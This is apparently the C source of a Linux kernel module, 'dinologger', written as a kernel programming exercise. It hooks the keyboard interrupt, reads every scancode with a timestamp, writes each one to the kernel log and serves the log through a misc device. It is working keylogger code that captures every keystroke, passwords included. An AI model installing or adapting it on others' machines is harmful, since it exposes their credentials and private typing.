#include "dinologger.h"

unsigned char *kbus[] = {US_KBMAP};
unsigned int stats[97] = {0};

static LIST_HEAD(file_list);
int device_size = 0;
int exiting = 0;

struct miscdevice misc;
int misc_open = 0;
static struct file_operations fops = {
	.owner = THIS_MODULE,
	.open = ct_open,
	.read = seq_read,
	.llseek = seq_lseek,
	.release = seq_release,
};
static const struct seq_operations seq_ops = {
        .start = seq_start,
        .next  = ct_seq_next,
        .stop  = seq_stop,
        .show  = seq_show
};

/* === UTILS === */

static log_node *lst_new(struct rtc_time *_time, int _scancode, int _release) {
	log_node *new;
	new = kmalloc(sizeof(log_node), GFP_KERNEL);

	new->time = *_time;
	new->scancode = _scancode;
	new->release = _release;

	list_add_tail(&new->list, &file_list);
	return new;
}

static void log_stats(void) {
	int max = 0;
	int sum = 0;
	for (int i = 0; i < 97; i++) {
		if (MAPPED(i)) {
			if (stats[i] > stats[max])
				max = i;
			sum += stats[i];
		}
	}
	if (sum > 0) {
		int ratio = (stats[max]*100)/sum;
		LOG("you pressed %d keys", sum);
		LOG("most pressed key is '%s': %d times (%d%%) !",
				kbus[max], stats[max], ratio);
	} else {
		LOG("you pressed no keys :(");
	}
}

static void free_file(void) {
	log_node *pos;
	log_node *tmp;
	list_for_each_entry_safe(pos, tmp, &file_list, list) {
		kfree(pos);
	}
}

/* === MISCDEVICE === */

static int ct_open(struct inode *inode, struct file *file) {
	if (misc_open)
		return -EBUSY;
	misc_open++;
	return seq_open(file, &seq_ops);
}

static void *seq_start(struct seq_file *s, loff_t *pos) {
	misc_open = 0;
	return seq_list_start(&file_list, *pos);
}
static void seq_stop(struct seq_file *_s, void *_v) {}

static void *ct_seq_next(struct seq_file *s, void *v, loff_t *pos) {
	return seq_list_next(v, &file_list, pos);
}

static int seq_show(struct seq_file *seq, void *v) {
	log_node *entry = list_entry(v, log_node, list);
	seq_printf(seq, "[%ptRt] %s (%d) %s\n",
			&entry->time, NAME(entry->scancode),
			entry->scancode, STATE(entry->release));
	return 0;
}

static int register_device(void) {
	misc.minor = MISC_DYNAMIC_MINOR;
	misc.name = DEVICE_NAME;
	misc.fops = &fops;

	int res = misc_register(&misc);
	if (res < 0) {
		LOG("failed to register - error code: %d", res);
		return res;
	}
	LOG("registered device");
	return 0;
}

static void unregister_device(void) {
	LOG("unregistering");
	misc_deregister(&misc);
}

/* === KEY HANDLER === */

static void add_entry(int scancode, int release, struct rtc_time *time) {
	LOG("[%ptRt] %s (%d) %s", time, NAME(scancode), scancode, STATE(release));
	lst_new(time, scancode, release);
	if (!release)
		STAT(scancode);
}

static irqreturn_t irq_handler(int irq, void *dev_id) {
	if (exiting)
		return IRQ_NONE;

	int scancode = inb(0x60);
	int release = scancode & RELEASE;
	scancode &= CANCEL_RELEASE;

	struct rtc_time time = rtc_ktime_to_tm(ktime_get_real());
	WINTER_TIME(time);

	add_entry(scancode, release, &time);
	return IRQ_NONE;
}

/* === INIT/EXIT === */

int __init m_init(void) {
	LOG("trying to init");
	int err = 0;

	err = register_device();
	if (err)
		return err;
	err = request_irq(1, irq_handler, IRQF_SHARED, "kb", (void *)irq_handler);
	if (err) {
		LOG("request_irq failed");
		return err;
	}
	return 0;
}

void __exit m_exit(void) {
	exiting = 1;

	unregister_device();
	log_stats();
	free_file();
	free_irq(1, (void *)irq_handler);
	return;
}

MODULE_LICENSE ("GPL");
MODULE_AUTHOR("DinoMalin");

module_init(m_init);
module_exit(m_exit);
